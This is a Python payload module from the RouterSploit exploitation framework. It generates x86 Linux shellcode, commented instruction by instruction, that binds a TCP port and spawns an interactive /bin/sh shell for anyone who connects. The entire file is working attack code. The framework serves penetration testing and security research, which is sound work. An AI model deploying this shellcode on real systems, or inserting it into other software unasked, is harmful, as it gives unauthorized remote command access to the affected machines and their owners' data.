from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    BindTCPPayloadMixin,
)


class Payload(BindTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "X86 Bind TCP",
        "description": "Creates interactive tcp bind shell for X86 architecture.",
        "authors": (
            "Ramon de C Valle",  # metasploit module
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        )
    }

    architecture = Architectures.X86

    def generate(self):
        bind_port = utils.convert_port(self.rport)

        return (
            b"\x31\xdb" +                  # xorl    %ebx,%ebx
            b"\xf7\xe3" +                  # mull    %ebx
            b"\x53" +                      # pushl   %ebx
            b"\x43" +                      # incl    %ebx
            b"\x53" +                      # pushl   %ebx
            b"\x6a\x02" +                  # pushl   $0x02
            b"\x89\xe1" +                  # movl    %esp,%ecx
            b"\xb0\x66" +                  # movb    $0x66,%al
            b"\xcd\x80" +                  # int     $0x80
            b"\x5b" +                      # popl    %ebx
            b"\x5e" +                      # popl    %esi
            b"\x52" +                      # pushl   %edx
            b"\x68\x02\x00" + bind_port +  # pushl   port
            b"\x6a\x10" +                  # pushl   $0x10
            b"\x51" +                      # pushl   %ecx
            b"\x50" +                      # pushl   %eax
            b"\x89\xe1" +                  # movl    %esp,%ecx
            b"\x6a\x66" +                  # pushl   $0x66
            b"\x58" +                      # popl    %eax
            b"\xcd\x80" +                  # int     $0x80
            b"\x89\x41\x04" +              # movl    %eax,0x04(%ecx)
            b"\xb3\x04" +                  # movb    $0x04,%bl
            b"\xb0\x66" +                  # movb    $0x66,%al
            b"\xcd\x80" +                  # int     $0x80
            b"\x43" +                      # incl    %ebx
            b"\xb0\x66" +                  # movb    $0x66,%al
            b"\xcd\x80" +                  # int     $0x80
            b"\x93" +                      # xchgl   %eax,%ebx
            b"\x59" +                      # popl    %ecx
            b"\x6a\x3f" +                  # pushl   $0x3f
            b"\x58" +                      # popl    %eax
            b"\xcd\x80" +                  # int     $0x80
            b"\x49" +                      # decl    %ecx
            b"\x79\xf8" +                  # jns     <bndsockcode+50>
            b"\x68\x2f\x2f\x73\x68" +      # pushl   $0x68732f2f
            b"\x68\x2f\x62\x69\x6e" +      # pushl   $0x6e69622f
            b"\x89\xe3" +                  # movl    %esp,%ebx
            b"\x50" +                      # pushl   %eax
            b"\x53" +                      # pushl   %ebx
            b"\x89\xe1" +                  # movl    %esp,%ecx
            b"\xb0\x0b" +                  # movb    $0x0b,%al
            b"\xcd\x80"                    # int     $0x80
        )
